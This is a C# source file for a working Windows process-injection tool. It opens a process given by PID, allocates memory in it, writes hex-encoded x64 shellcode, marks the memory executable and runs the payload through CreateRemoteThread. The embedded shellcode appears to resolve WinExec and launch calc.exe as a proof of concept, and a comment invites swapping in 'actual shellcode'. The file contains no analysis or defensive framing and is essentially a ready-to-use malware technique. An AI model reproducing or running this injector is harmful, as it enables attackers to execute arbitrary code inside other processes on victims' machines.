using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static byte[] ConvertShellcode(string shellcode)
    {
        // Remove all instances of "\\x" from the string
        shellcode = shellcode.Replace("\\x", "");

        // Initialize a byte array to hold the shellcode bytes
        int numberChars = shellcode.Length;
        byte[] bytes = new byte[numberChars / 2];

        // Convert each pair of hexadecimal characters to a byte
        for (int i = 0; i < numberChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(shellcode.Substring(i, 2), 16);
        }

        return bytes;
    }

    static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Usage: <program_name> <pid>");
            return;
        }

        if (int.TryParse(args[0], out int pid))
        {
            Console.WriteLine($"The provided PID is: {pid}");

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] OpenProcess Failed With Error : {0}", Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("[i] Successfully opened process with PID: {0}", pid);

                string shellcode1 = "\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b"+
    "\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2"+
    "\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b"+
    "\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04"+
    "\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0"+
    "\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2"+
    "\\x48\\x83\\xec\\x20\\x41\\xff\\xd6";
                byte[] shellcode = ConvertShellcode(shellcode1);
                // Replace with actual shellcode
                if (InjectShellcodeToRemoteProcess(hProcess, shellcode, (uint)shellcode.Length))
                {
                    Console.WriteLine("[+] Shellcode successfully injected and executed.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to inject shellcode.");
                }

                CloseHandle(hProcess);
                Console.WriteLine("[+] Closed the process handle.");
            }
        }
        else
        {
            Console.WriteLine("Invalid PID. Please provide a valid integer.");
        }
    }

    static bool InjectShellcodeToRemoteProcess(IntPtr hProcess, byte[] pShellcode, uint sSizeOfShellcode)
    {
        IntPtr pShellcodeAddress = IntPtr.Zero;
        UIntPtr sNumberOfBytesWritten;
        uint dwOldProtection;

        pShellcodeAddress = VirtualAllocEx(hProcess, IntPtr.Zero, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pShellcodeAddress == IntPtr.Zero)
        {
            Console.WriteLine("[!] VirtualAllocEx Failed With Error : {0}", Marshal.GetLastWin32Error());
            return false;
        }
        Console.WriteLine("[i] Allocated Memory At : 0x{0:X}", pShellcodeAddress);
        Console.WriteLine("[#] Press <Enter> To Write Payload ... ");
        Console.ReadLine();

        if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, out sNumberOfBytesWritten) ||
            sNumberOfBytesWritten.ToUInt32() != sSizeOfShellcode)
        {
            Console.WriteLine("[!] WriteProcessMemory Failed With Error : {0}", Marshal.GetLastWin32Error());
            return false;
        }
        Console.WriteLine("[i] Successfully Written {0} Bytes", sNumberOfBytesWritten);

        Array.Clear(pShellcode, 0, pShellcode.Length);

        if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, out dwOldProtection))
        {
            Console.WriteLine("[!] VirtualProtectEx Failed With Error : {0}", Marshal.GetLastWin32Error());
            return false;
        }
        Console.WriteLine("[#] Press <Enter> To Run ... ");
        Console.ReadLine();
        Console.WriteLine("[i] Executing Payload ... ");

        if (CreateRemoteThread(hProcess, IntPtr.Zero, 0, pShellcodeAddress, IntPtr.Zero, 0, out _) == IntPtr.Zero)
        {
            Console.WriteLine("[!] CreateRemoteThread Failed With Error : {0}", Marshal.GetLastWin32Error());
            return false;
        }
        Console.WriteLine("[+] DONE !");
        return true;
    }
}
